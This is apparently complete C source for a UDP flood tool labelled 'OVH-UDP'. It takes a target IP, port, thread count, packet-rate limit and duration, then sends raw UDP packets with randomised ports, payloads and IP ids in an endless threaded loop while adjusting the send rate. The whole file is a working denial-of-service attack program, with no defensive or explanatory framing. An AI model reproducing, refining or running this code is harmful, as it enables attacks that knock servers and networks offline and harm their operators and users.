#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodPort;
static unsigned int packetsPerSecond;
static unsigned int sleepTime = 100;
static int limiter;

void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

uint32_t util_external_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = (htonl((8 << 24) | (8 << 16) | (8 << 8) | (8 << 0)));
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

void setup_udp_header(struct udphdr *udpHeader)
{
    udpHeader->source = htons(rand() & 0xFFFF);
    udpHeader->dest = htons(floodPort);
    udpHeader->len = htons(8);
    udpHeader->check = 0;
}

void *flood(void *par1)
{
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *ipHeader = (struct iphdr *)datagram;
    struct udphdr *udpHeader = (void *)ipHeader + sizeof(struct iphdr);
    char *data;

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodPort);
    sin.sin_addr.s_addr = inet_addr(td);

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if (s < 0)
    {
        fprintf(stderr, "Could not open raw socket\n");
        exit(-1);
    }

    memset(datagram, 0, MAX_PACKET_SIZE);

    ipHeader->ihl = 5;
    ipHeader->version = 4;
    ipHeader->tos = 0;
    ipHeader->id = htons(54321);
    ipHeader->frag_off = 0;
    ipHeader->ttl = 111;
    ipHeader->protocol = 17;
    ipHeader->check = 0;
    ipHeader->saddr = util_external_addr();
    ipHeader->daddr = sin.sin_addr.s_addr;

    udpHeader->source = htons(rand() & 0xFFFF);
    udpHeader->dest = htons(floodPort);
    udpHeader->check = 0;
    int data_len = rand() % (120 - 90 + 1) + 90;

	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);

	for (int i = 0; i < data_len; i++) {
		data[i] = rand() % 256;
	}
	
	udpHeader->len = htons(sizeof(struct udphdr) + data_len);
    ipHeader->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
    ipHeader->check = csum((unsigned short *)datagram, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);


    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    init_rand(time(NULL));
    register unsigned int i;

    i = 0;
    while (1)
    {
        sendto(s, datagram, ntohs(ipHeader->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));

        packetsPerSecond++;
        if (i >= limiter)
        {
            i = 0;
            usleep(sleepTime);
        }
        i++;

        udpHeader->source = htons(rand() & 0xFFFF);
		data_len = rand() % (120 - 90 + 1) + 90;

		data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
		for (int j = 0; j < data_len; j++) {
			data[j] = rand() % 256;
		}

		udpHeader->len = htons(sizeof(struct udphdr) + data_len);
        ipHeader->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        ipHeader->id = htons(rand_cmwc() & 0xFFFF);
		ipHeader->check = csum((unsigned short *)datagram, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
    }
    return NULL;
}

int main(int argc, char *argv[])
{
    if (argc < 6)
    {
        fprintf(stdout, "OVH-UDP\n%s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        exit(-1);
    }

    fprintf(stdout, "Setting up networking...\n");

    int numThreads = atoi(argv[3]);
    floodPort = atoi(argv[2]);
    int maxPacketsPerSecond = atoi(argv[4]);
    limiter = (maxPacketsPerSecond == -1) ? -1 : maxPacketsPerSecond; //Use -1 for unlimited rate or define a number
    packetsPerSecond = 0;
    pthread_t thread[numThreads];
    int multiplier = 20;
    int i;

    for (i = 0; i < numThreads; i++)
    {
        pthread_create(&thread[i], NULL, &flood, (void *)argv[1]);
    }

    fprintf(stdout, "Starting...\n");

    for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
    {
        usleep((1000 / multiplier) * 1000);
        if (maxPacketsPerSecond != -1)
        {
            if ((packetsPerSecond * multiplier) > maxPacketsPerSecond)
            {
                if (1 > limiter)
                {
                    sleepTime += 100;
                }
                else
                {
                    limiter--;
                }
            }
            else
            {
                limiter++;
                if (sleepTime > 25)
                {
                    sleepTime -= 25;
                }
                else
                {
                    sleepTime = 0;
                }
            }
        }
        packetsPerSecond = 0;
    }
    return 0;
}
